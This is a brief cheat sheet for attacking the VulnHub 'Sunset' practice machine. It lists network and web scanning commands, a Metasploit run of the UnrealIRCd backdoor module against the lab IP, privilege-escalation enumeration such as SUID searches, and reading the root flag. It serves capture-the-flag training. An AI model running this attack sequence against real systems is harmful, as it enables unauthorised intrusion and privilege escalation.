# VulnHub Sunset — Cheat Sheet

**Target IP:** 192.168.1.124

## 1. Recon & Enumeration
```bash
# Find IP on network (if needed)
sudo arp-scan -l

# Scan target
nmap -sV 192.168.1.124

# Web enumeration (if port 80 open)
nikto -h http://192.168.1.124
gobuster dir -u http://192.168.1.124 -w /usr/share/wordlists/dirb/common.txt
```

## 2. Exploitation
```bash
# Research vulnerabilities based on service versions found
msfconsole
search UnrealIRCd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.1.124
run
```

## 3. Privilege Escalation
```bash
# Initial checks
whoami
id

# Enumeration commands
sudo -l
uname -a
find / -perm -4000 -type f 2>/dev/null
```

## 4. Flags
```bash
# Look for flags in common locations
ls /home
cat /root/root.txt
```
